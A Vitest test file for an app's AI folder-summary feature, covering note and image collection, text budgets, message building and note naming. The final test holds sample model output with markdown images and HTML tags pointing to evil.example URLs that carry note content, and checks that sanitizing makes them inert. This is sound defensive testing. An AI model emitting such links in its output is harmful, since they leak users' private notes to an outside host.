import { beforeEach, describe, expect, test, vi } from 'vitest'
import { parseNoteMarkdown } from '@/ui/workspace/folder-container/widgets/markdown'
import { MAX_SUMMARY_IMAGES, SUMMARY_TEXT_LIMIT, add_summary_note, build_summary_messages, collect_summary_sources, coverage_line, summary_entries, summary_note_name, summary_position } from './summarize'
import { image_to_data_url } from './imageInput'
import type { SummaryEntry } from './summarize'
import { strip_think, untrusted_markdown } from './text'

vi.mock('./imageInput', () => ({
	image_to_data_url: vi.fn(async (_: unknown, id: string) => (
		id.includes('bad') ? null : `data:image/jpeg;base64,${id}`
	)),
}))

const image_fn = vi.mocked(image_to_data_url)

const notes: Record<string, string> = {
	'/f/a.md': 'Alpha plan',
	'/f/b.md': 'Beta notes',
	'/f/empty.md': '   ',
	'/f/fail.md': 'should not be read',
}

const workspace = {
	read_note_content: vi.fn(async (id: string) => {
		if (id === '/f/fail.md') throw new Error('gone')
		return notes[id] ?? ''
	}),
	get_media_src: vi.fn(),
}

const file = (name: string, id = `/f/${name}`): SummaryEntry => ({ id, name, type: 'file' })
const folder = (name: string): SummaryEntry => ({ id: `/f/${name}`, name, type: 'folder' })

beforeEach(() => {
	image_fn.mockClear()
	workspace.read_note_content.mockClear()
})

describe('collect_summary_sources', () => {
	test('lists every name, reads notes and the first images, in the given order', async () => {
		const sources = await collect_summary_sources(workspace, [
			file('a.md'),
			file('IMG_2.jpg'),
			folder('Trip'),
			file('clip.mp4'),
			file('IMG_1.jpg'),
			file('b.md'),
		], { images_refused: false })

		expect(sources.names).toEqual(['a.md', 'IMG_2.jpg', 'Trip/', 'clip.mp4', 'IMG_1.jpg', 'b.md'])
		expect(sources.notes).toEqual([
			{ name: 'a.md', text: 'Alpha plan' },
			{ name: 'b.md', text: 'Beta notes' },
		])
		expect(sources.images.map(image => image.name)).toEqual(['IMG_2.jpg', 'IMG_1.jpg'])
		expect(sources.notes_full).toBe(2)
		expect(sources.notes_total).toBe(2)
		expect(coverage_line(sources)).toBeNull()
		expect(sources.images_total).toBe(2)
		expect(sources.images_refused).toBe(false)
		expect(image_fn).toHaveBeenCalledTimes(2)
	})

	test('does not read images when the model is known to refuse them; names still go', async () => {
		const sources = await collect_summary_sources(workspace, [
			file('a.md'),
			file('IMG_1.jpg'),
			file('IMG_2.jpg'),
		], { images_refused: true })

		expect(sources.names).toEqual(['a.md', 'IMG_1.jpg', 'IMG_2.jpg'])
		expect(sources.notes).toHaveLength(1)
		expect(sources.images).toEqual([])
		expect(sources.images_total).toBe(2)
		expect(sources.images_refused).toBe(true)
		expect(image_fn).not.toHaveBeenCalled()
	})

	test('keeps at most MAX_SUMMARY_IMAGES, the first ones, and skips an undecodable file', async () => {
		const images = Array.from({ length: MAX_SUMMARY_IMAGES + 2 }, (_, i) => file(`IMG_${i}.jpg`))
		images.splice(1, 0, file('skip.jpg', '/f/bad.jpg'))
		const sources = await collect_summary_sources(workspace, images, { images_refused: false })

		expect(sources.images_total).toBe(MAX_SUMMARY_IMAGES + 3)
		expect(sources.images.map(image => image.name)).toEqual(
			Array.from({ length: MAX_SUMMARY_IMAGES }, (_, i) => `IMG_${i}.jpg`),
		)
	})

	test('shares the text budget, so a long first note cannot crowd the next one out', async () => {
		notes['/f/long.md'] = 'x'.repeat(SUMMARY_TEXT_LIMIT)
		notes['/f/tail.md'] = 'y'.repeat(500)
		const sources = await collect_summary_sources(workspace, [file('long.md'), file('tail.md')], { images_refused: false })
		// max(MIN_NOTE_PART, floor(24000 / 2))
		expect(sources.notes[0]).toEqual({ name: 'long.md', text: 'x'.repeat(12_000) })
		expect(sources.notes[1]).toEqual({ name: 'tail.md', text: 'y'.repeat(500) })
		expect(sources.notes_full).toBe(1)
		expect(sources.notes_total).toBe(2)
		expect(coverage_line(sources)).toBe('2 of 2 notes included, shortened to fit')
	})

	test('sends the beginning of every note when none of them fit whole', async () => {
		const entries = Array.from({ length: 52 }, (_, i) => {
			const name = `share-${i}.md`
			notes[`/f/${name}`] = `n${i}:` + 'y'.repeat(2_000)
			return file(name)
		})
		const sources = await collect_summary_sources(workspace, entries, { images_refused: false })
		expect(sources.notes).toHaveLength(52)
		expect(sources.notes_full).toBe(0)
		expect(sources.notes_total).toBe(52)
		// max(MIN_NOTE_PART, floor(24000 / 52))
		expect(sources.notes[0]!.text).toHaveLength(461)
		expect(sources.notes.every((note, i) => note.text.startsWith(`n${i}:`) && note.text.length >= 400)).toBe(true)
		expect(coverage_line(sources)).toBe('52 of 52 notes included, shortened to fit')
	})

	test('an empty note is not counted as left out; an unreadable one is', async () => {
		const sources = await collect_summary_sources(workspace, [
			file('empty.md'),
			file('fail.md'),
			file('a.md'),
		], { images_refused: false })
		expect(sources.notes).toEqual([{ name: 'a.md', text: 'Alpha plan' }])
		expect(sources.notes_full).toBe(1)
		expect(sources.notes_total).toBe(2)
		expect(coverage_line(sources)).toBe('1 of 2 notes included')
	})

	test('reports progress for every entry, and stops reading after abort', async () => {
		const controller = new AbortController()
		const progress: string[] = []
		const sources = await collect_summary_sources(workspace, [file('a.md'), file('IMG_1.jpg'), file('b.md')], {
			images_refused: false,
			signal: controller.signal,
			on_progress: (done, total) => {
				progress.push(`${done}/${total}`)
				if (done === 1) controller.abort()
			},
		})
		expect(progress).toEqual(['1/3'])
		expect(sources.notes).toHaveLength(1)
		expect(sources.images).toHaveLength(0)
		expect(image_fn).not.toHaveBeenCalled()
	})
})

describe('coverage_line', () => {
	const empty = {
		names: [] as string[],
		notes: [] as { name: string; text: string }[],
		images: [] as { name: string; url: string }[],
		notes_full: 0,
		notes_total: 0,
		images_total: 0,
		images_refused: false,
	}

	test('is null when everything fit', () => {
		expect(coverage_line({
			...empty,
			notes: [{ name: 'a.md', text: 'x' }],
			images: [{ name: 'a.jpg', url: 'data:' }],
			notes_full: 1,
			notes_total: 1,
			images_total: 1,
		})).toBeNull()
	})

	test('names what was left out, always, including a known no-vision model', () => {
		expect(coverage_line({
			...empty,
			images: Array.from({ length: 12 }, (_, i) => ({ name: `${i}.jpg`, url: 'data:' })),
			notes: Array.from({ length: 30 }, (_, i) => ({ name: `${i}.md`, text: 'x' })),
			notes_full: 30,
			images_total: 40,
			notes_total: 52,
		})).toBe('12 of 40 images and 30 of 52 notes included')

		expect(coverage_line({
			...empty,
			images_total: 40,
			images_refused: true,
		})).toBe("0 of 40 images included: the model doesn't accept images")

		expect(coverage_line({
			...empty,
			notes: [{ name: 'a.md', text: 'x' }],
			notes_full: 1,
			notes_total: 52,
			images_total: 40,
			images_refused: true,
		})).toBe("0 of 40 images and 1 of 52 notes included: the model doesn't accept images")
	})

	test('a shortened note is included, and the line says it was not whole', () => {
		expect(coverage_line({
			...empty,
			notes: [{ name: 'long.md', text: 'x' }, { name: 'tail.md', text: 'y' }],
			notes_full: 1,
			notes_total: 2,
		})).toBe('2 of 2 notes included, shortened to fit')
	})
})

describe('build_summary_messages', () => {
	test('sends only text when there are no images', () => {
		const messages = build_summary_messages({
			names: ['a.md', 'Trip/', 'shot.jpg'],
			notes: [{ name: 'a.md', text: 'Alpha plan' }],
			images: [],
			notes_full: 1,
			notes_total: 1,
			images_total: 1,
			images_refused: true,
		}, 'Rome')
		expect(messages[0]!.role).toBe('system')
		expect(messages[1]).toEqual({
			role: 'user',
			content: [
				'Board "Rome" holds:',
				'- a.md',
				'- Trip/',
				'- shot.jpg',
				'\n## Note "a.md"\nAlpha plan',
			].join('\n'),
		})
	})

	test('attaches each included image as its own part; vision true does not change that', () => {
		const messages = build_summary_messages({
			names: ['a.jpg', 'b.jpg'],
			notes: [],
			images: [
				{ name: 'a.jpg', url: 'data:image/jpeg;base64,A' },
				{ name: 'b.jpg', url: 'data:image/jpeg;base64,B' },
			],
			notes_full: 0,
			notes_total: 0,
			images_total: 2,
			images_refused: false,
		}, 'Photos')
		expect(messages[1]!.content).toEqual([
			{ type: 'text', text: expect.stringContaining('Board "Photos" holds:') },
			{ type: 'text', text: 'Image "a.jpg":' },
			{ type: 'image_url', image_url: { url: 'data:image/jpeg;base64,A' } },
			{ type: 'text', text: 'Image "b.jpg":' },
			{ type: 'image_url', image_url: { url: 'data:image/jpeg;base64,B' } },
		])
	})
})

describe('summary_entries and summary_position', () => {
	test('files stay files; folder widgets become folders', () => {
		expect(summary_entries([
			{ id: '/f/a.md', name: 'a.md', type: 'file' },
			{ id: '/f/Trip', name: 'Trip', type: 'folder_container' },
			{ id: '/f/Cover', name: 'Cover', type: 'folder_cover' },
		] as never)).toEqual([
			{ id: '/f/a.md', name: 'a.md', type: 'file' },
			{ id: '/f/Trip', name: 'Trip', type: 'folder' },
			{ id: '/f/Cover', name: 'Cover', type: 'folder' },
		])
	})

	test('places the note to the right of the topmost placed widget', () => {
		expect(summary_position([
			{ position: { x: 10, y: 40 }, size: { width: 100, height: 50 } },
			{ position: { x: 80, y: 8 }, size: { width: 60, height: 20 } },
			{},
		])).toEqual({ x: 164, y: 8 })
		expect(summary_position([{}, {}])).toBeNull()
	})
})

describe('summary_note_name', () => {
	test('is Summary.md, numbered when taken, the way the file system compares names', () => {
		expect(summary_note_name([])).toBe('Summary.md')
		expect(summary_note_name(['Summary.md'])).toBe('Summary (1).md')
		expect(summary_note_name(['summary.md'])).toBe('Summary (1).md')
		expect(summary_note_name(['Summary.md', 'summary (1).MD'])).toBe('Summary (2).md')
	})
})

describe('add_summary_note', () => {
	test('creates, fills, then renames to a unique Summary.md without reporting a rename toast', async () => {
		const rename = vi.fn(async () => {})
		const ws = {
			create_note: vi.fn(async () => '/f/Note 1.md'),
			save_note_content: vi.fn(async () => {}),
			resolve_folder_data: () => ({
				children: [
					{ id: '/f/Note 1.md', name: 'Note 1.md' },
					{ id: '/f/summary.md', name: 'summary.md' },
				],
			}),
			rename,
		}
		await add_summary_note(ws as never, '/f', '  # Rome\n- bags  ', { x: 10, y: 20 })
		expect(ws.create_note).toHaveBeenCalledWith('/f', { x: 10, y: 20 })
		expect(ws.save_note_content).toHaveBeenCalledWith('/f/Note 1.md', '# Rome\n- bags\n')
		expect(rename).toHaveBeenCalledWith('/f/Note 1.md', 'Summary (1).md', { report: false })
	})

	test('keeps the Note N.md name when rename fails, so the text is not lost', async () => {
		const ws = {
			create_note: vi.fn(async () => '/f/Note 2.md'),
			save_note_content: vi.fn(async () => {}),
			resolve_folder_data: () => ({ children: [] }),
			rename: vi.fn(async () => {
				throw new Error('taken')
			}),
		}
		await add_summary_note(ws as never, '/f', '# Kept', null)
		expect(ws.create_note).toHaveBeenCalledWith('/f', undefined)
		expect(ws.save_note_content).toHaveBeenCalled()
		expect(ws.rename).toHaveBeenCalled()
	})

	test('an injected remote image is text in the preview and in the saved note', async () => {
		const raw = [
			'<think>mention the secret plan</think>',
			'# Summary',
			'- secret plan',
			'![](https://evil.example/?q=secret%20plan)',
			'![photo](https://evil.example/a_(1).png "shot")',
			'<video poster="https://evil.example/?q=secret%20plan"></video>',
			'<picture><source srcset="https://evil.example/s.png"></picture>',
			'<p style="background:url(https://evil.example/b.png)">x</p>',
		].join('\n')
		// The same renderer the preview uses. Without the escape these are real tags.
		const live = parseNoteMarkdown('<video poster="https://evil.example/a.png"></video><picture><source srcset="https://evil.example/s.png"></picture><p style="background:url(https://evil.example/b.png)">x</p>')
		expect(live).toMatch(/<video\b/i)
		expect(live).toMatch(/\sposter\s*=/i)
		expect(live).toMatch(/<source\b/i)
		expect(live).toMatch(/\sstyle\s*=/i)

		const summary = untrusted_markdown(strip_think(raw))
		const summary_html = parseNoteMarkdown(summary)
		// The tag is text. marked may autolink the bare address; that still loads only on a click.
		expect(summary_html).not.toMatch(/<(video|audio|source|picture|img|object|embed|iframe)\b/i)
		expect(summary_html).not.toMatch(/<[a-z][^>]*\s(?:poster|srcset|style)\s*=/i)
		expect(summary_html).toContain('poster')
		expect(summary_html).toContain('srcset')
		expect(summary_html).toContain('background')
		expect(summary_html).toContain('secret plan')
		expect(summary_html).toContain('photo')
		expect(summary).not.toContain('](https://evil.example')
		expect(summary).not.toContain('<think')
		expect(summary).not.toContain('<video')

		const save = vi.fn(async () => {})
		await add_summary_note({
			create_note: vi.fn(async () => '/f/Note 1.md'),
			save_note_content: save,
			resolve_folder_data: () => ({ children: [] }),
			rename: vi.fn(async () => {}),
		} as never, '/f', raw, null)
		expect(save).toHaveBeenCalledWith('/f/Note 1.md', `${summary}\n`)
	})
})
